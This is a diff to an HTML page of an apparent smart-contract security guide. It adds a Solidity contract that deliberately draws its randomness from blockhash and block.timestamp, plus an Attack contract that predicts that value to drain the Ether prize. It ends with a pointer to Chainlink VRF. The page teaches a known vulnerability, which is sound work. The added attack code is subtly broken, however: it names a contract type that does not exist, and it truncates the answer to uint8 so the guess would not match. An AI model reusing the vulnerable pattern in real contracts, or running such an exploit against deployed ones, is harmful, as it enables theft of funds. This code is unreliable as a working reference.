@@ -174,8 +174,51 @@
                 <div id="content" class="content">
                     <main>
                         <h2 id="weak-sources-of-randomness-from-chain-attributes"><a class="header" href="#weak-sources-of-randomness-from-chain-attributes">Weak Sources of Randomness from Chain Attributes</a></h2>
-<p>Using chain attributes for randomness, e.g.: <code>block.timestamp</code>, <code>blockhash</code>, and <code>block.difficulty</code> can seem like a good idea since they often produce pseudo-random values. The problem however, is that Ethereum is entirely deterministic and all available on-chain data is public. Chain attributes can either be predicted or manipulated, and should thus never be used for random number generation.</p>
-<p>A common solution is to use an oracle solution such as <a href="https://docs.chain.link/vrf/v2/introduction/">Chainlink VRF</a>.</p>
+<p>Using chain attributes for randomness, e.g.: <code>block.timestamp</code>, <code>blockhash</code>, and <code>block.difficulty</code> can seem like a good idea since they often produce pseudo-random values. The problem, however, is that Ethereum is entirely deterministic and all available on-chain data is public. Chain attributes can either be predicted or manipulated, and should thus never be used for random number generation.</p>
+<h3 id="example-of-weak-randomness"><a class="header" href="#example-of-weak-randomness">Example of Weak Randomness</a></h3>
+<pre><code class="language-solidity">pragma solidity ^0.8.24;
+
+contract GuessTheRandomNumber {
+    constructor() payable {}
+
+    function guess(uint256 _guess) public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        if (_guess == answer) {
+            (bool sent,) = msg.sender.call{value: 1 ether}("");
+            require(sent, "Failed to send Ether");
+        }
+    }
+}
+</code></pre>
+<p>In the above example, the answer variable is initialized using <code>blockhash(block.number - 1)</code> and <code>block.timestamp</code>. This method is insecure because both <code>blockhash</code> and <code>block.timestamp</code> can be retrieved directly by another contract just in time, making it possible to guess the answer and win the challenge unfairly.</p>
+<p>An attacker can exploit the weak randomness as follows:</p>
+<pre><code class="language-solidity">contract Attack {
+    receive() external payable {}
+
+    function attack(GuessTheRandomNumberChallenge guessTheRandomNumber) public {
+        uint256 answer = uint256(
+            keccak256(
+                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
+            )
+        );
+
+        guessTheRandomNumber.guess(uint8(answer));
+    }
+
+    // Helper function to check balance
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+<p>The <code>Attack</code> contract calculates the <code>answer</code> using the same logic as the <code>GuessTheRandomNumber</code> contract and guesses it correctly, allowing the attacker to win the challenge.</p>
+<h3 id="preventive-measures"><a class="header" href="#preventive-measures">Preventive Measures</a></h3>
+<p>A common and more secure solution is to use an oracle service such as <a href="https://docs.chain.link/vrf/v2/introduction/">Chainlink VRF</a>, which provides verifiable randomness that cannot be manipulated.</p>
 <h3 id="sources"><a class="header" href="#sources">Sources</a></h3>
 <ul>
 <li><a href="https://swcregistry.io/docs/SWC-120">SWC Registry: SWC-120</a></li>
